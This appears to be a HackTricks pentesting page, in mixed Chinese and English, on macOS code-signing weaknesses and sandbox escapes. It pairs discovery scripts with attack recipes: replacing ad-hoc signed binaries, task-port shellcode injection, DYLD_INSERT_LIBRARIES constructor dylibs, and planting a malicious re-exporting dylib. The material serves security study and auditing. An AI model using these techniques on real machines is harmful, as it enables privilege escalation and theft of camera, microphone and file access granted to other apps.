# macOS Code Signing Weaknesses & Sandbox Escapes

{{#include ../../../banners/hacktricks-training.md}}

## Ad-Hoc Signed Binaries

### Basic Information

**Ad-hoc signing** (`CS_ADHOC`) 创建一种**没有证书链**的 code signature —— 它只是代码的哈希值，不包含 developer identity 验证。无法将该 binary 的来源追溯到任何 developer 或组织。<sup>[[1]](#references)[[4]](#references)</sup>

在 Apple Silicon Mac 上，所有 executable 至少都需要 ad-hoc signature。这意味着你会在许多 development tools、Homebrew packages 和 third-party utilities 中发现 ad-hoc signatures。

### Why This Matters

- **没有可验证的身份** —— binary 可以被替换，而基于 identity 的检查无法检测到
- 位于**特权位置**（FDA、daemon、helpers）中的 third-party ad-hoc binaries 是高优先级目标
- 在某些配置中，ad-hoc signatures 的验证可能**不如 developer-signed code 严格**
- 具有 **TCC grants** 的 ad-hoc signed binaries 尤其有价值 —— 即使 binary 内容发生变化，这些 grants 仍会保留（取决于 TCC 对 grant 采用的 key） 

### Discovery
```bash
# Find ad-hoc signed binaries
find /usr/local /opt /Applications -type f -perm +111 -exec sh -c '
flags=$(codesign -dvv "{}" 2>&1 | grep "CodeDirectory flags")
echo "$flags" | grep -q "adhoc" && echo "AD-HOC: {}"
' \; 2>/dev/null

# Check a specific binary
codesign -dv --verbose=4 /path/to/binary 2>&1 | grep -E "Signature|flags|Authority"
# Ad-hoc shows: "Signature=adhoc" and no Authority lines
```
### Attack: Binary Replacement
```bash
# If an ad-hoc signed daemon binary is in a writable location:
# 1. Check the binary's current capabilities
codesign -d --entitlements - /path/to/target 2>&1

# 2. Note its TCC grants in the database
sqlite3 ~/Library/Application\ Support/com.apple.TCC/TCC.db \
"SELECT service, auth_value FROM access WHERE client LIKE '%target%';"

# 3. Replace the binary (if location is writable)
cp /tmp/malicious-binary /path/to/target

# 4. Re-sign with ad-hoc signature (mimics the original)
codesign -s - /path/to/target

# 5. On next launch, the daemon runs your code with the original's TCC grants
# (This works when TCC keyed the grant by path rather than code signature)
```
---

## 可调试进程（get-task-allow）

### 基本信息

**`com.apple.security.get-task-allow`** entitlement（或 **`CS_GET_TASK_ALLOW`** flag）允许**任何进程作为 debugger 附加**，读取内存、修改寄存器、注入代码并控制执行。<sup>[[3]](#references)</sup>

这项功能**仅适用于 development builds**。然而，一些第三方 binary 在 production 中仍包含此 entitlement。

> [!CAUTION]
> 包含 `get-task-allow` 的 production binary 是一个**可立即利用的 exploitation primitive**。任何本地进程都可以调用 `task_for_pid()`，获取目标的 Mach task port，并注入任意代码；这些代码将以目标的 entitlements、TCC grants 和 security context 运行。

### 发现
```bash
# Find debuggable binaries
find /Applications /usr/local -type f -perm +111 -exec sh -c '
codesign -d --entitlements - "{}" 2>&1 | grep -q "get-task-allow.*true" && echo "DEBUGGABLE: {}"
' \; 2>/dev/null

# Using the scanner
sqlite3 /tmp/executables.db "
SELECT path, privileged FROM executables e
JOIN executable_capabilities ec ON e.id = ec.executable_id
JOIN capabilities c ON ec.capability_id = c.id
WHERE c.name = 'get_task_allow_signature'
ORDER BY e.privileged DESC;"
```
### Attack: Task Port Injection
```c
#include <mach/mach.h>
#include <mach/mach_vm.h>

// Get the target's task port (requires get-task-allow on target)
mach_port_t task;
kern_return_t kr = task_for_pid(mach_task_self(), target_pid, &task);

if (kr == KERN_SUCCESS) {
// Allocate memory in target process
mach_vm_address_t addr = 0;
mach_vm_allocate(task, &addr, shellcode_size, VM_FLAGS_ANYWHERE);

// Write shellcode into target
mach_vm_write(task, addr, (vm_offset_t)shellcode, shellcode_size);

// Make it executable
mach_vm_protect(task, addr, shellcode_size, FALSE,
VM_PROT_READ | VM_PROT_EXECUTE);

// Create a remote thread to execute the shellcode
// The shellcode runs with ALL of the target's entitlements and TCC grants
}
```
---

## 无 Library Validation + DYLD Environment

### Runtime Library-Validation Clearing

私有 entitlement **`com.apple.private.security.clear-library-validation`** 不会在进程启动时 disable library validation。相反，它允许进程在运行时对自身调用 `csops(..., CS_OPS_CLEAR_LV, ...)`。如果调用者拥有该 entitlement 并满足 handler 的其他检查条件，XNU 随后会清除 `CS_REQUIRE_LV | CS_FORCED_LV`。因此，进程只有在执行到清除 library validation 的代码路径后，才可能成为可行的 library-injection 目标。<sup>[[4]](#references)[[5]](#references)</sup>

### 致命组合

当一个 binary 同时具有以下 entitlement 时：<sup>[[3]](#references)</sup>
- `com.apple.security.cs.disable-library-validation`（加载任意 dylib）
- `com.apple.security.cs.allow-dyld-environment-variables`（接受 DYLD 环境变量）

这是一种**保证成功的 code injection 原语**——`DYLD_INSERT_LIBRARIES` 可以完美运行。

### Discovery
```bash
# Find binaries with the deadly combo
find /Applications -type f -perm +111 -exec sh -c '
ents=$(codesign -d --entitlements - "{}" 2>&1)
echo "$ents" | grep -q "disable-library-validation.*true" && \
echo "$ents" | grep -q "allow-dyld-environment.*true" && \
echo "INJECTABLE: {}"
' \; 2>/dev/null

# Using the scanner (both flags)
sqlite3 /tmp/executables.db "
SELECT path, privileged, tccPermsStr FROM executables
WHERE noLibVal = 1 AND allowDyldEnv = 1
ORDER BY privileged DESC;"
```
### Attack: DYLD_INSERT_LIBRARIES Injection
```bash
# 1. Create the injection dylib
cat > /tmp/inject.c << 'EOF'
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

__attribute__((constructor))
void injected(void) {
// This runs BEFORE main() in the target's process
// We inherit ALL of the target's:
// - Entitlements
// - TCC grants (camera, mic, FDA, etc.)
// - Sandbox exceptions
// - Mach port rights

FILE *f = fopen("/tmp/injected_proof.txt", "w");
fprintf(f, "Running as PID %d with target's privileges\n", getpid());
fclose(f);

// Example: if target has camera TCC, we can now capture video
// Example: if target has FDA, we can read any file
}
EOF

# 2. Compile the dylib
cc -shared -o /tmp/inject.dylib /tmp/inject.c

# 3. Inject into the target
DYLD_INSERT_LIBRARIES=/tmp/inject.dylib /path/to/noLibVal-dyldEnv-binary

# 4. Verify injection
cat /tmp/injected_proof.txt
```
---

## Sandbox 临时例外

### 它们如何削弱 Sandbox

Sandbox 临时例外（`com.apple.security.temporary-exception.*`）在 App Sandbox 中打开了缺口：<sup>[[2]](#references)</sup>

| Exception | 允许的操作 |
|---|---|
| `temporary-exception.mach-lookup.global-name` | 连接到系统范围的 XPC/Mach 服务 |
| `temporary-exception.files.absolute-path.read-write` | 读取/写入 app container 外部的文件 |
| `temporary-exception.iokit-user-client-class` | 打开 IOKit user-client 连接 |
| `temporary-exception.shared-preference.read-only` | 读取其他 app 的偏好设置 |
| `temporary-exception.files.home-relative-path.read-write` | 访问相对于 `~` 的路径 |

### Mach-Lookup 例外 = Sandbox Escape 原语

最危险的例外是 **mach-lookup** ——它允许处于 Sandbox 中的 app 与特权 daemon 通信：
```bash
# Find apps with mach-lookup exceptions
find /Applications -name "*.app" -exec sh -c '
binary="$1/Contents/MacOS/$(defaults read "$1/Contents/Info.plist" CFBundleExecutable 2>/dev/null)"
[ -f "$binary" ] && {
ents=$(codesign -d --entitlements - "$binary" 2>&1)
echo "$ents" | grep -q "mach-lookup" && {
count=$(echo "$ents" | grep -c "mach-lookup")
echo "[$count exceptions] $(basename "$1")"
}
}
' _ {} \; 2>/dev/null | sort -rn
```
### 攻击：通过 Mach-Lookup 实现 Sandbox Escape
```
1. Compromise sandboxed app (renderer exploit, malicious document, etc.)
2. Read entitlements to discover mach-lookup exceptions
3. For each reachable service:
a. Connect via NSXPCConnection
b. Discover the service's protocol (class-dump, strings)
c. Fuzz each exposed method
4. Find a vulnerability in a privileged daemon
5. Exploit → code execution in the daemon's context (outside sandbox)
```
---

## Private Apple Entitlements

### What They Are

以 `com.apple.private.*` 为前缀的 Entitlements 提供对 **Apple 内部 API** 的访问权限，这些 API 未公开文档说明，也不向第三方开发者提供。拥有 private entitlements 的第三方二进制文件通常通过 enterprise cert、MDM 或非 App Store 分发方式获得这些权限。

### Dangerous Private Entitlements

| Entitlement | Capability |
|---|---|
| `com.apple.private.tcc.manager` | 完全读写 TCC 数据库 |
| `com.apple.private.tcc.allow` | 访问特定 TCC 服务 |
| `com.apple.private.security.no-sandbox` | 在无 sandbox 的情况下运行 |
| `com.apple.private.iokit` | 直接访问 IOKit 驱动程序 |
| `com.apple.private.kernel.\*` | 访问内核接口 |
| `com.apple.private.xpc.launchd.job-label` | 注册/管理 launchd jobs |
| `com.apple.rootless.install` | 写入受 SIP 保护的路径 |

### Discovery
```bash
# Find third-party binaries with private entitlements
find /Applications /usr/local -type f -perm +111 -exec sh -c '
ents=$(codesign -d --entitlements - "{}" 2>&1)
echo "$ents" | grep -q "com.apple.private" && {
echo "=== {} ==="
echo "$ents" | grep "com.apple.private" | head -10
}
' \; 2>/dev/null

# Using the scanner
sqlite3 /tmp/executables.db "
SELECT path FROM executables
WHERE privateEnts = 1 AND isAppleBin = 0
ORDER BY privileged DESC;"
```
---

## 自定义 Sandbox 配置文件（SBPL）

### 它们是什么

二进制文件可以携带使用 SBPL（Seatbelt Profile Language）编写的**自定义 Sandbox 配置文件**。与默认的 App Sandbox 相比，这些配置文件可能限制更多，也可能**允许更多操作**。

### 审计自定义配置文件
```bash
# Find custom sandbox profiles
find /Applications /System -name "*.sb" -o -name "*.sbpl" 2>/dev/null

# Dangerous SBPL rules to flag during audit:
# (allow file-write*)         — Write to ANY file
# (allow process-exec*)       — Execute ANY process
# (allow mach-lookup*)        — Connect to ANY Mach service
# (allow network*)            — Full network access
# (allow iokit*)              — Full IOKit access
# (allow file-read*)          — Read ANY file

# Example: Audit a sandbox profile for overly permissive rules
cat /path/to/custom.sb | grep "(allow" | sort -u
```
---

## 可写 Library 路径

### 其定义

当二进制文件从当前用户可以**写入**的路径加载 dynamic library 时，该 library 可能会被替换为恶意代码。

### 发现
```bash
# Using the scanner — find privileged binaries loading from writable paths
sqlite3 /tmp/executables.db "
SELECT e.path, e.privileged
FROM executables e
JOIN executable_capabilities ec ON e.id = ec.executable_id
JOIN capabilities c ON ec.capability_id = c.id
WHERE c.name = 'execs_writable_path'
ORDER BY e.privileged DESC
LIMIT 30;"

# Manual check: list library dependencies and check writability
otool -L /path/to/binary | awk '{print $1}' | while read lib; do
[ -f "$lib" ] && [ -w "$lib" ] && echo "WRITABLE: $lib"
done
```
### 攻击：Dylib Replacement
```bash
# 1. Find the writable library
otool -L /path/to/target-daemon | grep "/usr/local\|/opt\|Library"

# 2. Back up the original
cp /path/to/writable.dylib /tmp/original.dylib

# 3. Create a replacement that re-exports the original
cat > /tmp/evil.c << 'EOF'
#include <stdio.h>
__attribute__((constructor))
void evil(void) {
system("id > /tmp/escalated.txt");
}
EOF
cc -shared -o /tmp/evil.dylib /tmp/evil.c \
-Wl,-reexport_library,/tmp/original.dylib

# 4. Replace the library
cp /tmp/evil.dylib /path/to/writable.dylib

# 5. When the daemon restarts, it loads the evil dylib with daemon privileges
```
## References

- [1] [Apple Developer — Code Signing 指南](https://developer.apple.com/library/archive/technotes/tn2206/_index.html)
- [2] [Apple Developer — App Sandbox](https://developer.apple.com/library/archive/documentation/Security/Conceptual/AppSandboxDesignGuide/AboutAppSandbox/AboutAppSandbox.html)
- [3] [Apple Developer — Entitlements](https://developer.apple.com/documentation/bundleresources/entitlements)
- [4] [XNU — `bsd/sys/codesign.h`（`CS_OPS_*` 操作和 `CLEAR_LV_ENTITLEMENT`）](https://github.com/apple-oss-distributions/xnu/blob/main/bsd/sys/codesign.h)
- [5] [XNU — `bsd/kern/kern_proc.c`（`csops` / `CS_OPS_CLEAR_LV` 处理程序）](https://github.com/apple-oss-distributions/xnu/blob/main/bsd/kern/kern_proc.c)
{{#include ../../../banners/hacktricks-training.md}}
